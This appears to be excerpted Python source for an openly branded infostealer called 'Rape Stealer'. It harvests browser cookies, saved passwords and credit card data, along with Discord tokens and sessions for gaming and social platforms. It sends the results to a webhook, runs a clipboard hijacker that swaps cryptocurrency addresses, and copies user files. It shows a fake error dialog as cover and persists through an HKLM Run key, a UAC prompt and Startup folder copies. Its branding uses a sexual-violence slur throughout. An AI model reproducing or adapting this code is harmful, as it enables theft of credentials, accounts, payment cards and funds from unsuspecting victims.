...
webhook = "%WEBHOOK%"
discord_injection = str("%injection%") == "True"
startup_method = "%startup_method%".lower()
Anti_VM = str("%Anti_VM%") == "True"
FakeError = (str("%fake_error%") == "True", ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))
...
class Chromelevator:
    ...
    async def Run(temp_path: str):
        try:
            ...
            if os.path.exists(dest_path):
                cmd = f'"{dest_path}" all -o "{output_dir}"'
                ...
                # Parse Results
                await Chromelevator.ParseResults(output_dir)
    ...
    @staticmethod
    async def ParseResults(output_dir: str):
        if not os.path.exists(output_dir): return
        
        # Walk through browser folders
        for browser in os.listdir(output_dir):
            browser_path = os.path.join(output_dir, browser)
                ...
                if os.path.exists(cookies_file):
                    try:
                        with open(cookies_file, 'r', encoding='utf-8', errors='ignore') as f:
                            data = json.load(f)
                            for c in data:
                                # Format: Host \t Flag \t Path \t Secure \t Expiry \t Name \t Value
                                secure_flag = "TRUE" if c.get('secure', False) else "FALSE" # Assuming 'secure' key or similar, tool output says: host, name, path, expires, value. Missing secure/httponly in example, guessing standard JSON.
                                # Wait, the tool help shows: host, name, path, expires, value. 
                                # It does NOT show 'secure' or 'httpOnly'. 
                                # Standard mapping: host, flag(FALSE), path, secure(FALSE), expires, name, value
                                # I will try to infer or default.
                                host = c.get('host', '')
                                ...
                                formatted = f"{host}\t{flag}\t{path}\t{secure}\t{expiry}\t{name}\t{value}\n"
                                Variables.Cookies.append(formatted)
                    except: pass
                
                # Process Passwords
                pass_file = os.path.join(profile_path, "passwords.json")
                    ...
                    try:
                        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
                            ...
                            for p in data:
                                ...
                                Variables.Passwords.append(formatted)
                    except: pass

                # Process Cards
                card_file = os.path.join(profile_path, "payments.json")
                if os.path.exists(card_file):
                    try:
                        with open(card_file, 'r', encoding='utf-8', errors='ignore') as f:
                            data = json.load(f)
                            for card in data:
                                # Format: Number \t Month/Year \t Name
                                number = card.get('number', '')
                                month = card.get('month', '')
                                year = card.get('year', '')
                                name = card.get('name', '')
                                formatted = f"{number}\t{month}/{year}\t{name}\n"
                                Variables.Cards.append(formatted)
                    except: pass

class CryptoClipper:
    def __init__(self):
        try:
            val = CryptoAddressConfig
            if isinstance(val, dict):
                self.addresses = val
            elif isinstance(val, str):
                 try:
                     self.addresses = ast.literal_eval(val) if val.startswith("{") else {}
                 except:
                     self.addresses = {}
            else:
                 self.addresses = {}
        ...
        self.regex = {
            ...
            "BCH": re.compile(r"^((bitcoincash:)?(q|p)[a-z0-9]{41})"),
            ...
            "LTC": re.compile(r"^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$"),
            "XRP": re.compile(r"^r[1-9A-HJ-NP-Za-km-z]{25,34}$"),
    ...
    async def Start(self):
        ...
        while True:
            try:
                ...
                if content:
                    for coin, pattern in self.regex.items():
                        if pattern.match(content):
                            my_addr = self.addresses.get(coin)
                            if my_addr and content != my_addr:
                                pyperclip.copy(my_addr)
                                break
            except:
                pass
...
class Main:
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "🩸 ***Rape Stealer*** 🩸",
                    "description": f"***Rape Riot Games Session was detected on the {browser} browser***",
                    "url" : "https://t.me/RapeStealer",
                    "color": 16711680,
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "📸 ***Rape Stealer*** 📸",
                "description": f"***Rape Instagram Session was detected on the {browser} browser***",
                "url" : "https://t.me/RapeStealer",
                "color": 16711680,
                "footer": {"text": "https://t.me/RapeStealer | https://github.com/quicaxd/badhappens/Rape-01"},
                "thumbnail": {"url": pp}}
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "🎵 ***Rape Stealer*** 🎵",
                "description": f"***Rape Tiktok Session was detected on the {browser} browser***",
                "url" : "https://t.me/RapeStealer",
                "color": 16711680,
                "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "🐦 ***Rape Stealer*** 🐦",
                "description": f"***Rape Twitter Session was detected on the {browser} browser***",
                "url" : "https://t.me/RapeStealer",
                "color": 16711680,
                "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
                "thumbnail": {"url": pp}}
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "👾 ***Rape Stealer*** 👾",
                "description": f"***Rape Twitch Session was detected on the {browser} browser***",
                "url" : "https://t.me/RapeStealer",
                "color": 16711680,
                "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
                "thumbnail": {"url": pp}}
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "🎧 ***Rape Stealer*** 🎧",
                "description": f"***Rape Spotify Session was detected on the {browser} browser***",
                "url" : "https://t.me/RapeStealer",
                "color": 16711680,
                "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "🤖 ***Rape Stealer*** 🤖",
                "description": f"***Rape Reddit Session was detected on the {browser} browser***",
                "url" : "https://t.me/RapeStealer",
                "color": 16711680,
                "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
                "thumbnail": {"url": pp}}
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "🎮 ***Rape Stealer*** 🎮",
                    "description": f"***Rape Roblox Session was detected on the {browser} browser***",
                    "url" : "https://t.me/RapeStealer",
                    "color": 16711680,
                    "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
                    "thumbnail": {"url": pp}}
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "💎 ***Rape Stealer*** 💎",
                "description": f"***Rape Validated Discord Token Detected***",
                "url" : "https://t.me/RapeStealer",
                "color": 16711680,
                "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
                "thumbnail": {"url": ""}}
    ...
    async def SendContains(self) -> None:
        try:
            ...
            embed_data = {
                "title": "🗝️ ***Rape Stealer*** 🗝️",
                "description": f"***Keyword Result***",
                "url" : "https://t.me/RapeStealer",
                "color": 16711680,
                "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
                "thumbnail": {"url": "https://seyler.ekstat.com/img/max/800/d/dgndGTohCGIMM3QT-637692084962939433.jpg"}}
            fields = [
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "💀 ***Rape Stealer*** 💀",
            "description": f"***Rape Stealer Full Info***",
            "url" : "https://t.me/RapeStealer",
            "color": 16711680,
            "footer": {"text": "https://t.me/RapeStealer | https://github.com/badhappens/Rape-01"},
            "thumbnail": {"url": "https://seyler.ekstat.com/img/max/800/d/dgndGTohCGIMM3QT-637692084962939433.jpg"}}
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "StealedFilesByRape")
...
class Startup:
    def __init__(self) -> None:
        # Use Windows API to get actual exe path (works for Nuitka onefile)
        try:
            kernel32 = ctypes.windll.kernel32
            buffer = ctypes.create_unicode_buffer(260)
            kernel32.GetModuleFileNameW(None, buffer, 260)
            actual_exe = buffer.value
            
            
            if actual_exe.endswith('.py') or 'TEMP' in actual_exe.upper():
                cwd_exe = os.path.join(os.getcwd(), 'Rape.exe')
                if os.path.exists(cwd_exe):
                    actual_exe = cwd_exe
            
            self.OriginalExe = actual_exe
        except:
    ...
    async def RegeditStartup(self) -> None: 
        try:
            # ALWAYS use permanent path
            exe_path = self.PermanentPath
            
            # ONLY write to HKLM (user request)
            if not self.Privalage:
                print("[!] Admin required for HKLM. Requesting UAC...")
                try:
                    # Request admin
                    result = ctypes.windll.shell32.ShellExecuteW(
                        None, "runas", 
                        self.PermanentPath if os.path.exists(self.PermanentPath) else sys.executable,
                        "", None, 1
                    )
                    if result > 32:
                        print("[+] Restarting with admin...")
                        os._exit(0)
                    else:
                        print("[-] Admin denied. Cannot write to HKLM.")
                except:
                    pass
                return
            
            # Write to HKLM (with admin)
            cmd = f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RapeService" /t REG_SZ /d "{exe_path}" /f'
            process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                print(f"[+] Added to HKLM: {exe_path}")
            else:
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rape.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.PermanentPath, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rape.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                startup_path = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Rape.exe")
                if os.path.isfile(startup_path):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.PermanentPath, startup_path)
        except Exception as e:
            print(str(e))
...
if __name__ == '__main__':
    if os.name == "nt":
        ...
        if not SubModules.create_mutex("Rape | Stealar | on top |"):
